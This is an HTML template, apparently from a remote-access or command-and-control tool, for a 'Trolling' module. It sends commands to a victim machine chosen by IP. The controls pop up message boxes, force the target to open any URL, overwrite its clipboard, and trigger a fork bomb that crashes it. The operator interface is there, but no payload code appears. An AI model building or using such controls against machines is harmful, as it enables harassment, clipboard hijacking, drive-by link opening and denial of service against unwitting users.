<div class="col-span-1 md:col-span-2 glass-effect rounded-xl p-6 shadow-lg">
    <div class="flex items-center gap-3 mb-4">
        <div
            class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
        >
            <svg
                class="w-4 h-4 text-gray-300"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
            >
                <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                ></path>
            </svg>
        </div>
        <h3 class="text-xl font-semibold text-white">Trolling (TRL)</h3>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
        <form
            hx-post="/api/command/{{ ip }}"
            hx-target="#command-output-{{ ip }}"
        >
            <input type="hidden" name="module" value="TRL" />
            <input type="hidden" name="args.action" value="message_box" />
            <input
                type="text"
                name="args.title"
                placeholder="Message Title"
                class="w-full px-4 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:border-gray-400 transition-all mb-3"
            />
            <textarea
                name="args.text"
                placeholder="Message Text"
                class="w-full px-4 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:border-gray-400 transition-all mb-3"
                rows="2"
            ></textarea>
            <button
                type="submit"
                class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200"
            >
                Show Message
            </button>
        </form>
        <div class="space-y-3">
            <form
                hx-post="/api/command/{{ ip }}"
                hx-target="#command-output-{{ ip }}"
            >
                <input type="hidden" name="module" value="TRL" />
                <input type="hidden" name="args.action" value="open_link" />
                <input
                    type="url"
                    name="args.url"
                    placeholder="https://example.com"
                    class="w-full px-4 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:border-gray-400 transition-all mb-3"
                />
                <button
                    type="submit"
                    class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200"
                >
                    Open Link
                </button>
            </form>
            <form
                hx-post="/api/command/{{ ip }}"
                hx-target="#command-output-{{ ip }}"
            >
                <input type="hidden" name="module" value="TRL" />
                <input type="hidden" name="args.action" value="set_clipboard" />
                <input
                    type="text"
                    name="args.text"
                    placeholder="Clipboard Text"
                    class="w-full px-4 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:border-gray-400 transition-all mb-3"
                />
                <button
                    type="submit"
                    class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200"
                >
                    Set Clipboard
                </button>
            </form>
            <form
                hx-post="/api/command/{{ ip }}"
                hx-target="#command-output-{{ ip }}"
            >
                <input type="hidden" name="module" value="TRL" />
                <input type="hidden" name="args.action" value="fork_bomb" />
                <button
                    type="submit"
                    class="w-full bg-red-800 hover:bg-red-900 text-white py-2 rounded-lg transition-all duration-200 font-bold"
                >
                    !!! FORK BOMB !!!
                </button>
            </form>
        </div>
    </div>
</div>

<style>
    .glass-effect {
        background: rgba(32, 32, 32, 0.8);
        backdrop-filter: blur(20px);
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
</style>
